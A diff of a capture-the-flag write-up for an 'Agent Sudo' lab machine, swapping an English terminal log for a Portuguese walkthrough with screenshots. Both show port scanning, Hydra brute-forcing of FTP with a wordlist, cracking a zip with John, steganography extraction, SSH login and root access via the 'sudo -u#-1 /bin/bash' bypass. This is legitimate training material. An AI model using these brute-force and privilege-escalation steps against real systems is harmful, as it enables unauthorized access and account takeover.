@@ -1,111 +1,111 @@
-```bash
-┌──(xnv㉿xnv)-[~/thm/agent-sudo]
-└─$ nmap -A 10.10.252.69
-```
-21/tcp open ftp vsftpd 3.0.3
+# Agent-Sudo
 
-22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-| 2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
-| 256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
-|_ 256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
-
-80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: Annoucement
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+* ### Scan de portas - Verificando quais portas estão abertas.
 
 ```bash
-┌──(xnv㉿xnv)-[~/thm/agent-sudo]
-└─$ hydra -l chris -P ~/rockyou.txt [<ftp://10.10.252.69>](<ftp://10.10.252.69/>)
-```
-[21][ftp] host: 10.10.252.69 login: chris password: *******
-
-```bash
-┌──(luffe㉿Kalizin)-[~/THM/agente-sudo]
-└─$ binwalk -e cutie.png
+rustscan -a 10.10.20.48
 ```
 
+![image](https://github.com/lufffe/Writeups/assets/90646635/cd3568d5-c517-4d16-9d14-a72a6a77943b)
+
+
+![image](https://github.com/lufffe/Writeups/assets/90646635/f394bbd5-c321-478c-9931-506790ea7383)
+
+
+* ### Verificando o que está rodando nas portas encontradas.
 ```bash
-┌──(xnv㉿xnv)-[~/thm/agent-sudo]
-└─$ unzip _cutie.png.extracted
+nmap -A -p 21,22,80 10.10.20.48
 ```
-cutie.png.extract
+![image](https://github.com/lufffe/Writeups/assets/90646635/4c62a143-6d89-4fe2-8ffb-2ba7da07a262)
+
+* ### Olhando no http
+  
+![image](https://github.com/lufffe/Writeups/assets/90646635/589e6c75-6ab2-46c1-a20e-c991c03bc289)
+
 
 ```bash
-┌──(xnv㉿xnv)-[~/thm/agent-sudo]
-└─$ zip2john 8702.zip > hash.txt
+curl -A "C" -L 10.10.224.108
+```
+![image](https://github.com/lufffe/Writeups/assets/90646635/de62aa42-e5d5-4322-b7d2-6cef17f7d6e5)
+
+* ###  Scan de Arquivos e Diretórios.
+```bash
+gobuster dir -u http://10.10.20.48 -w directory-list-2.3-small.txt -t 100 --no-error
 ```
 
+* ### Bruteforce no FTP
 ```bash
-┌──(root💀xnv)-[/home/…/thm/agent-sudo/_cutie.png.extracted]
-└─# john hash.txt -wordlist=../../../../rockyou.txt
-```
-alien (8702.zip/To_agentR.txt)
-
-```bash
-┌──(xnv㉿Kali)-[~/thm/agent-sudo/_cutie.png.extracted]
-└─$ 7z x 8702.zip
+hydra -l chris -P ~/rockyou.txt ftp://10.10.20.48
 ```
 
+![image](https://github.com/lufffe/Writeups/assets/90646635/59be2048-e06f-4409-92e1-5182a28763e7)
+
+* ### Acessando o FTP.
 ```bash
-┌──(xnv㉿xnv)-[~/thm/agent-sudo/_cutie.png.extracted]
-└─$ cat To_agentR.txt
+ftp 10.10.20.48
 ```
+![image](https://github.com/lufffe/Writeups/assets/90646635/e3b8c8f2-4606-482e-a2d0-fba0f607b853)
 
-Agent C,
-
-We need to send the picture to 'QXJlYTUx' as soon as possible!
-
-By,
-
-Agent R
-
-<aside> 💡 DECODE BASE64 / ******
-
-</aside>
 
 ```bash
-┌──(xnv㉿Kali)-[~/thm/agent-sudo]
-└─$ steghide extract -sf cute-alien.jpg
+binwalk -e cutie.png
+```
+![image](https://github.com/lufffe/Writeups/assets/90646635/9e894823-400d-44d9-af12-e80691915f8a)
+
+```bash
+zip2john 8702.zip > hash.txt 
 ```
 
 ```bash
-┌──(xnv㉿Kali)-[~/thm/agent-sudo]
-└─$ cat message.txt
+john --wordlist=~/rockyou.txt hash.txt
 ```
-Hi james,
 
-Glad you find this message. Your login password is ************
+![image](https://github.com/lufffe/Writeups/assets/90646635/ca6362d6-01f4-47fb-bef1-96a9ca9afd71)
+
+ 
+```bash
+7z x 8702.zip 
+```
+![image](https://github.com/lufffe/Writeups/assets/90646635/67030a0b-8f9b-472a-bb11-c8d73fe80f07)
 
 ```bash
-james@agent-sudo:~$ cat user_flag.txt
+cat To_agentR.txt 
 ```
-> ********************************
+![image](https://github.com/lufffe/Writeups/assets/90646635/d59d51b8-dce2-4e9b-84e8-9641c2ebcc9f)
+
+
+![image](https://github.com/lufffe/Writeups/assets/90646635/e3d6aa92-6bbd-48b6-a641-378aa139910b)
 
 ```bash
-┌──(xnv㉿Kali)-[~/thm/agent-sudo]
-└─$ scp james@10.10.209.115:/home/james/Alien_autospy.jpg
+steghide extract -sf cute-alien.jpg
 ```
 
-```bash
-james@agent-sudo:~$ sudo -l
+![image](https://github.com/lufffe/Writeups/assets/90646635/5aa953fc-08b7-4af4-9326-f9bb0297ae44)
+
+
+
+```Bash
+cat message.txt
 ```
-Matching Defaults entries for james on agent-sudo:
-env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-User james may run the following commands on agent-sudo:
-(ALL, !root) /bin/bash
+![image](https://github.com/lufffe/Writeups/assets/90646635/86e61009-c530-4622-8d1b-9a93bd9486ff)
+
+```Bash
+ssh james@10.10.20.48
+```
+![image](https://github.com/lufffe/Writeups/assets/90646635/f488accb-48ed-496f-b3af-e55bcee36c0e)
+
+```bash
+cat user_flag.txt
+```
+> ##################################
+
+```bash
+sudo -l
+```
+![image](https://github.com/lufffe/Writeups/assets/90646635/43eff9af-ea8b-4d66-8f8d-a7f6f6653bda)
 
 ```bash
 james@agent-sudo:~$ sudo -u#-1 /bin/bash
 ```
+![image](https://github.com/lufffe/Writeups/assets/90646635/8607e831-f124-42bf-aab4-2662af23ffdc)
 
-```bash
-root@agent-sudo:~# id
-```
-uid=0(root) gid=1000(james) groups=1000(james)
-
-```bash
-root@agent-sudo:~#  cat /root/root.txt
-```
-> ********************************
